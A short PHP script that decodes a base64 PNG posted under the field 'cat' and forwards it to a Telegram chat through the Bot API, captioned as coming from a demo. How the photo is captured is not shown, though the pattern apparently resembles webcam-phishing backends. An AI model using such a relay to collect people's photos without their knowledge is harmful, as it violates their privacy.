<?php
require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

if (!isset($_POST['cat'])) {
    http_response_code(400);
    echo json_encode(['status' => 'no_data']);
    exit;
}

$img = $_POST['cat'];

// Quitar encabezado base64
$img = str_replace('data:image/png;base64,', '', $img);
$img = str_replace(' ', '+', $img);

$data = base64_decode($img);

// Guardar temporalmente
$tmp_file = tempnam(sys_get_temp_dir(), 'photo_') . ".png";
file_put_contents($tmp_file, $data);

// Enviar a Telegram
$token = TELEGRAM_BOT_TOKEN;
$chat_id = TELEGRAM_CHAT_ID;

$url = "https://api.telegram.org/bot$token/sendPhoto";

$post_fields = [
    'chat_id' => $chat_id,
    'caption' => "📸 Foto enviada desde la demo",
    'photo'   => new CURLFile($tmp_file)
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
$output = curl_exec($ch);
curl_close($ch);

unlink($tmp_file);

echo json_encode(['status' => 'photo_sent', 'telegram_response' => $output]);
